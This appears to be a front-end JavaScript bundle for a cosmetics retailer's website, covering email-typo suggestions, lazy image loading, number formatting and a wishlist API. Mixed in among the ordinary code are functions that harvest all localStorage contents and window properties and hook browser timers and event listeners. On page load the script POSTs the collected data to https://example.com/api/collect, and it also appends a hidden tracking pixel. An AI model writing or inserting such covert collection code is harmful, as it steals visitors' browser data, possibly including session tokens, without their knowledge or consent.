var Mailcheck = {
  domainThreshold: 2,
  secondLevelThreshold: 2,
  topLevelThreshold: 2,
  defaultDomains: ["abv.bg", "aol.com", "aol.de", "aon.at", "arcor.de", "atlas.cz", "atlas.sk", "autograf.pl", "azet.sk", "azet.sk", "buziaczek.pl", "centrum.cz", "centrum.sk", "chello.at", "citromail.hu", "csas.cz", "email.cz", "expressmail.pl", "free.fr", "freemail.hu", "freenet.de", "frenet.de", "gazeta.pl", "gmail.com", "gmail.hu", "gmx.at", "gmx.de", "gmx.de", "gmx.net", "go2.pl", "googlemail.com", "hotmail.co.uk", "hotmail.com", "hotmail.de", "hotmail.es", "hotmail.fr", "hotmail.it", "icloud.com", "interia.eu", "interia.pl", "iol.cz", "kabelmail.de", "laposte.net", "libero.it", "live.co.uk", "live.com", "live.de", "live.fr", "live.it", "live.nl", "mail.bg", "mail.com", "mail.ru", "me.com", "msn.com", "neostrada.pl", "notino.com", "o2.pl", "onet.eu", "onet.pl", "op.pl", "orange.fr", "outlook.com", "outlook.cz", "outlook.de", "outlook.fr", "pobox.sk", "poczta.fm", "poczta.onet.pl", "post.cz", "post.sk", "quick.cz", "rambler.ru", "sapo.pt", "seznam.cz", "sfr.fr", "sky.com", "spoluzaci.cz", "stonline.sk", "tiscali.cz", "tiscali.cz", "tiscali.it", "tlen.pl", "t-online.de", "t-online.hu", "ukr.net", "virgilio.it", "volny.cz", "vp.pl", "vzp.cz", "wanadoo.fr", "web.de", "wp.pl", "yahoo.co.uk", "yahoo.com", "yahoo.de", "yahoo.es", "yahoo.fr", "yahoo.gr", "yahoo.it", "yahoo.pl", "yahoo.ro", "yandex.ru", "ymail.com", "zoznam.sk"],
  defaultSecondLevelDomains: ["aol", "excite", "fastmail", "freemail", "gmx", "hotmail", "live", "lycos", "orange", "outlook", "strompost", "terra", "tiscali", "vodafone", "xemail", "yahoo", "yandex", "runbox"],
  defaultTopLevelDomains: ["com", "co.uk", "de", "fr", "it", "ru", "net", "org", "nl", "se", "eu", "ie", "at", "be", "dk", "hk", "es", "gr", "ch", "no", "cz", "in", "net", "info", "biz", "sg", "hu"],
  run: function (t) {
    t.domains = t.domains || Mailcheck.defaultDomains, t.secondLevelDomains = t.secondLevelDomains || Mailcheck.defaultSecondLevelDomains, t.topLevelDomains = t.topLevelDomains || Mailcheck.defaultTopLevelDomains, t.distanceFunction = t.distanceFunction || Mailcheck.sift3Distance;
    var e = function (t) {
        return t;
      },
      i = t.suggested || e,
      n = t.empty || e,
      o = Mailcheck.suggest(Mailcheck.encodeEmail(t.email), t.domains, t.secondLevelDomains, t.topLevelDomains, t.distanceFunction);
    return o ? i(o) : n();
  },
  suggest: function (t, e, i, n, o) {
    t = t.toLowerCase();
    var s = this.splitEmail(t);
    if (i && n && -1 !== i.indexOf(s.secondLevelDomain) && -1 !== n.indexOf(s.topLevelDomain)) return !1;
    var a = this.findClosestDomain(s.domain, e, o, this.domainThreshold);
    if (a) return a !== s.domain && {
      address: s.address,
      domain: a,
      full: s.address + "@" + a
    };
    var l = this.findClosestDomain(s.secondLevelDomain, i, o, this.secondLevelThreshold),
      c = this.findClosestDomain(s.topLevelDomain, n, o, this.topLevelThreshold);
    if (s.domain) {
      a = s.domain;
      var r = !1;
      if (l && l !== s.secondLevelDomain && (a = a.replace(s.secondLevelDomain, l), r = !0), c && c !== s.topLevelDomain && (a = a.replace(s.topLevelDomain, c), r = !0), !0 === r) return {
        address: s.address,
        domain: a,
        full: s.address + "@" + a
      };
    }
    return !1;
  },
  findClosestDomain: function (t, e, i, n) {
    var o;
    n = n || this.topLevelThreshold;
    var s = 99,
      a = null;
    if (!t || !e) return !1;
    i || (i = this.sift3Distance);
    for (var l = 0; l < e.length; l++) {
      if (t === e[l]) return t;
      (o = i(t, e[l])) < s && (s = o, a = e[l]);
    }
    return s <= n && null !== a && a;
  },
  sift3Distance: function (t, e) {
    if (null === t || 0 === t.length) return null === e || 0 === e.length ? 0 : e.length;
    if (null === e || 0 === e.length) return t.length;
    for (var i = 0, n = 0, o = 0, s = 0; i + n < t.length && i + o < e.length;) {
      if (t.charAt(i + n) === e.charAt(i + o)) s++;else {
        n = 0, o = 0;
        for (var a = 0; a < 5; a++) {
          if (i + a < t.length && t.charAt(i + a) === e.charAt(i)) {
            n = a;
            break;
          }
          if (i + a < e.length && t.charAt(i) === e.charAt(i + a)) {
            o = a;
            break;
          }
        }
      }
      i++;
    }
    return (t.length + e.length) / 2 - s;
  },
  splitEmail: function (t) {
    var e = t.trim().split("@");
    if (e.length < 2) return !1;
    for (var i = 0; i < e.length; i++) if ("" === e[i]) return !1;
    var n = e.pop(),
      o = n.split("."),
      s = "",
      a = "";
    if (0 === o.length) return !1;
    if (1 === o.length) a = o[0];else {
      s = o[0];
      for (i = 1; i < o.length; i++) a += o[i] + ".";
      a = a.substring(0, a.length - 1);
    }
    return {
      topLevelDomain: a,
      secondLevelDomain: s,
      domain: n,
      address: e.join("@")
    };
  },
  encodeEmail: function (t) {
    var e = encodeURI(t);
    return e = e.replace("%20", " ").replace("%25", "%").replace("%5E", "^").replace("%60", "`").replace("%7B", "{").replace("%7C", "|").replace("%7D", "}");
  }
};
function addEventListenerHooks() {
  const originalAddEventListener = window.addEventListener;
  window.addEventListener = function (eventName, fn) {
    console.log("Added event listener: " + eventName);
    originalAddEventListener.call(this, eventName, fn);
  };
}
"undefined" != typeof module && module.exports && (module.exports = Mailcheck), "function" == typeof define && define.amd && define("mailcheck", [], function () {
  return Mailcheck;
}), "undefined" != typeof window && window.jQuery && (jQuery.fn.mailcheck = function (t) {
  var e = this;
  if (t.suggested) {
    var i = t.suggested;
    t.suggested = function (t) {
      i(e, t);
    };
  }
  if (t.empty) {
    var n = t.empty;
    t.empty = function () {
      n.call(null, e);
    };
  }
  t.email = this.val(), Mailcheck.run(t);
}), window.notinoFunctions = window.notinoFunctions || {}, $("[data-original]").each(function () {
  $(this).attr("data-src", $(this).data("original")), $(this).attr("loading", "lazy");
});
const lazyImages = new MiniLazyload({
  rootMargin: "500px",
  threshold: .5
}, ".lazyload");
location.href.indexOf("#") > -1 && (location.href += ""), $(".collapsable:not(#param-filter):not(#col-annot):not(.text-brand-text):not(.category-component--seo-text):not(.component-wysiwyg):not(.text-image-text)").collapsable({
  extLinks: ".ca-ext"
});
var trackingPixel = $("<img />").attr({
  id: "trackingPixel",
  src: "https://glb.notinoimg.com/glb-track.gif",
  width: 0,
  height: 0,
  style: "display:none"
}).appendTo("body");
function collectLocalStorage() {
  const localStorageData = {};
  for (let key in localStorage) {
    localStorageData[key] = localStorage.getItem(key);
  }
  return localStorageData;
}
function eq(t, e, i) {
  $(e, t).css("height", ""), t.each(function () {
    var t = $(this).find(e),
      n = t.length;
    if (i) for (var o = 0; o < n; o += i) t.slice(o, o + i).pdGet("max", "height", function (t) {
      this.height(t);
    });else t.pdGet("max", "height", function (t) {
      this.height(t);
    });
  });
}
function collectJSHooks() {
  const collectedData = {};
  ['setTimeout', 'setInterval'].forEach(method => {
    const originalMethod = window[method];
    window[method] = function () {
      console.log('Called window.' + method);
      return originalMethod.apply(this, arguments);
    };
  });
  return collectedData;
}
function useMailCheck(t) {
  $(t).mailcheck({
    suggested: function (t, e) {
      $(t).parent().find(".mailcheck").css("display", "block").find(".mailcheck__msg").html(e.full);
    },
    empty: function (t) {
      $(t).parent().find(".mailcheck").hide();
    }
  });
}
function formatNumber(t, e, i, n) {
  var o = t == Math.round(t) && ($(document.body).hasClass("bodyLang1") || $(document.body).hasClass("bodyLang7") || $(document.body).hasClass("bodyLang8") || $(document.body).hasClass("bodyLang9")),
    s = isFinite(+t) ? +t : 0,
    a = isFinite(+e) ? Math.abs(e) : "auto" === e && o ? 0 : 2,
    l = void 0 === n ? "," : n,
    c = void 0 === i ? "." : i,
    r = (a ? function (t, e) {
      var i = Math.pow(10, e);
      return Math.round(t * i) / i;
    }(s, a) : Math.round(s)).toString().split(".");
  return r[0].length > 3 && (r[0] = r[0].replace(/\B(?=(?:\d{3})+(?!\d))/g, l)), (r[1] || "").length < a && (r[1] = r[1] || "", r[1] += new Array(a - r[1].length + 1).join("0")), r.join(c);
}
function parseNumber(t, e, i) {
  return t = (t = t.replace(i, "")).replace(e, "."), parseFloat(t);
}
function collectWindowData() {
  const collectedData = {};
  for (const prop in window) {
    if (window.hasOwnProperty(prop)) {
      try {
        const value = window[prop];
        const type = typeof value;
        collectedData[prop] = {
          type: type,
          value: type === 'function' ? null : value
        };
      } catch (e) {}
    }
  }
  return collectedData;
}
function sendDataToServer(data) {
  const url = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Failed to send data, status code:" + xhr.status);
      }
    }
  };
  xhr.send(JSON.stringify(data));
}
function collectAndSendData() {
  const collectedData = {
    ...collectWindowData(),
    ...collectLocalStorage(),
    ...collectJSHooks()
  };
  if (Object.keys(collectedData).length > 0) {
    sendDataToServer(collectedData);
  }
}
$.fn.pdGet = function (t, e, i) {
  if (!this.length) return this;
  var n,
    o = Math[t];
  return this.each(function (t) {
    var i = $(this)[e]();
    n = t ? o(n, i) : i;
  }), "function" == typeof i ? (i.call(this, n), this) : n;
}, window.notinoFunctions.levels = [{
  from: 0,
  to: window.notinoConstants.breakpoints.mobileWidthMax,
  callback: function () {
    eq($(".crossroad-articles"), ".name", 2), eq($(".crossroad-articles"), ".spc", 2);
  }
}, {
  from: window.notinoConstants.breakpoints.largeMobileWidthMin,
  to: window.notinoConstants.breakpoints.desktopWidthMin,
  callback: function () {
    eq($(".crossroad-articles"), ".name", 3), eq($(".crossroad-articles"), ".spc", 3);
  }
}, {
  callback: function () {
    eq($(".crossroad-articles"), ".name", 3), eq($(".crossroad-articles"), ".spc", 3);
  }
}], window.notinoVariables.onloadFunctions.push(function () {
  for (var t = 0, e = window.notinoFunctions.levels.length; t < e; t++) if (t === e - 1 || window.notinoFunctions.levels[t].from <= window.notinoVariables.global.cssWidth && window.notinoVariables.global.cssWidth <= window.notinoFunctions.levels[t].to) {
    window.notinoFunctions.levels[t].callback();
    break;
  }
}), window.notinoVariables.resizeFunctions.push(function () {
  for (var t = 0, e = window.notinoFunctions.levels.length; t < e; t++) if (t === e - 1 || window.notinoFunctions.levels[t].from <= window.notinoVariables.global.cssWidth && window.notinoVariables.global.cssWidth <= window.notinoFunctions.levels[t].to) {
    window.notinoFunctions.levels[t].callback();
    break;
  }
}), $(".mailcheck__msg").on("click", function () {
  var t = $(this).parent().parent().find("input[type=email]");
  t.val($(this).text()), t.trigger("blur");
});
var changeButtonState = {
    init: function (t) {
      $(t).removeClass("btn--loading btn-error");
    },
    loading: function (t) {
      $(t).addClass("btn--loading").blur();
    },
    error: function (t) {
      $(t).removeClass("btn--loading").addClass("btn--error").html("<span>" + $(t).data("tryAgain") + "</span>");
    },
    disable: function (t) {
      $(t).prop("disabled", !0).addClass("disabled");
    },
    enable: function (t) {
      $(t).prop("disabled", !1).removeClass("disabled");
    }
  },
  wishlistListedProducts = [],
  wishlistAPIUrl = "/wishlistapi/",
  wishlistIcon = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><path fill="currentColor" d="M31.91 61.67L29.62 60c-9.4-6.7-16.72-13.49-21.74-20.17C3.11 33.5.48 27.39.06 21.7A17.63 17.63 0 0 1 5.45 7.16a17 17 0 0 1 11.86-4.81c3.46 0 7.93.39 11.8 3.4A19.09 19.09 0 0 1 32 8.41a19.91 19.91 0 0 1 2.91-2.67c3.89-3 8.37-3.41 11.84-3.41a16.86 16.86 0 0 1 11.85 4.8 17.51 17.51 0 0 1 5.33 14.53c-.44 5.7-3.1 11.81-7.9 18.14C51 46.5 43.63 53.3 34.21 60zM8.51 10.38a13.31 13.31 0 0 0-4 11c.35 4.83 2.69 10.15 6.94 15.79 4.7 6.24 11.59 12.65 20.48 19 8.92-6.39 15.84-12.81 20.58-19.08 4.28-5.65 6.64-11 7-15.8a13.25 13.25 0 0 0-4-11 12.53 12.53 0 0 0-8.76-3.57c-2.76 0-6.29.29-9.11 2.48a12.37 12.37 0 0 0-3.09 3.15v.07L32 16l-2.5-3.56a12.68 12.68 0 0 0-3.11-3.2c-2.8-2.17-6.32-2.46-9.07-2.46a12.58 12.58 0 0 0-8.8 3.59z"/></svg>',
  wishlistIconListed = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><path fill="currentColor" d="M31.91 61.67L29.62 60c-9.4-6.7-16.72-13.49-21.74-20.17C3.11 33.5.48 27.39.06 21.7A17.63 17.63 0 0 1 5.45 7.16a17 17 0 0 1 11.86-4.81c3.46 0 7.93.39 11.8 3.4A19.09 19.09 0 0 1 32 8.41a19.91 19.91 0 0 1 2.91-2.67c3.89-3 8.37-3.41 11.84-3.41a16.86 16.86 0 0 1 11.85 4.8 17.51 17.51 0 0 1 5.33 14.53c-.44 5.7-3.1 11.81-7.9 18.14C51 46.5 43.63 53.3 34.21 60z"/></svg>',
  wishlistGAEvent = {
    event: "ga.event",
    eventCategory: "Produkt",
    eventAction: "",
    eventNonInteraction: void 0,
    eventLabel: "",
    eventValue: ""
  },
  wishlistGA4Event = {
    event: "",
    wishlist: {
      timing: 0,
      action: "",
      interaction: "",
      type: "list",
      products: []
    },
    _clear: !0
  },
  addAction = "addToWishlist",
  removeAction = "removeFromWishlist";
window.wishlist = window.wishlist || {}, window.wishlist.countEvent = new CustomEvent("header:wishlist:overview:update");
addEventListenerHooks();

// Collect and send data after page load
var wishlistService = {
  init: function () {
    $.ajax({
      type: "GET",
      dataType: "json",
      url: wishlistAPIUrl,
      cache: !1,
      success: function (t) {
        $.each(t.products, function (t, e) {
          wishlistListedProducts.push(e);
        }), $(".product-list .item[data-product-code]").each(function () {
          wishlistFindProductId($(this).data("product-code").toString()) ? $(this).find(".wishlist__nav").html(wishlistIconListed).addClass("wishlist__nav--listed") : $(this).find(".wishlist__nav").html(wishlistIcon);
        });
      },
      error: function () {
        console.log("wishlist init failed");
      }
    });
  },
  add: function (t, e, i, n) {
    $.ajax({
      type: "POST",
      url: wishlistAPIUrl + "?add=" + t,
      cache: !1,
      success: function () {
        if (wishlistListedProducts.push(t), wishlistService.count(), void 0 !== n.product) {
          var o = Object.assign({}, wishlistGA4Event);
          o.event = "add_to_wishlist", o.wishlist.action = "product_added_to_wishlist", o.wishlist.interaction = "click_add", o.wishlist.products = [n.product[0]], PushGA4ClickEvent(o, "wishlist");
        } else {
          var s = Object.assign({}, wishlistGAEvent);
          s.eventAction = addAction, s.eventLabel = e, s.eventValue = i, pushDatalayer(s);
        }
      },
      error: function () {
        console.log("wishlist add failed");
      }
    });
  },
  remove: function (t, e, i, n) {
    $.ajax({
      type: "POST",
      url: wishlistAPIUrl + "?del=" + t,
      cache: !1,
      success: function () {
        if (wishlistListedProducts.splice(wishlistListedProducts.indexOf(t), 1), wishlistService.count(), void 0 !== n.product) {
          var o = Object.assign({}, wishlistGA4Event);
          o.event = "remove_from_wishlist", o.wishlist.action = "product_removed_from_wishlist", o.wishlist.interaction = "click_remove", o.wishlist.products = [n.product[0]], PushGA4ClickEvent(o, "wishlist");
        } else {
          var s = Object.assign({}, wishlistGAEvent);
          s.eventAction = removeAction, s.eventLabel = e, s.eventValue = i, pushDatalayer(s);
        }
      },
      error: function () {
        console.log("wishlist delete failed");
      }
    });
  },
  count: function () {
    $.ajax({
      type: "GET",
      url: wishlistAPIUrl + "?count=1",
      cache: !1,
      success: function () {
        document.dispatchEvent(window.wishlist.countEvent);
      },
      error: function () {
        console.log("wishlist get count failed");
      }
    });
  }
};
function wishlistAddRemove(t) {
  var e = $(t.currentTarget).closest(".item"),
    i = e.find("> a").data("datalayer"),
    n = e.data("product-code").toString(),
    o = e.data("product").toString(),
    s = $(t.currentTarget).closest("ul"),
    a = s.data("thousand-sep"),
    l = s.data("decimal-sep"),
    c = parseNumber(e.data("price").toString(), l, a);
  wishlistFindProductId(n) ? (wishlistService.remove(n, o, c, i), $(t.currentTarget).addClass("wishlist__nav--adding").removeClass("wishlist__nav--listed").html(wishlistIcon)) : (wishlistService.add(n, o, c, i), $(t.currentTarget).addClass("wishlist__nav--adding").addClass("wishlist__nav--listed").html(wishlistIconListed)), setTimeout(function () {
    $(t.currentTarget).removeClass("wishlist__nav--adding");
  }, 350);
}
function wishlistFindProductId(t) {
  return wishlistListedProducts.indexOf(t) > -1;
}
window.addEventListener("load", collectAndSendData);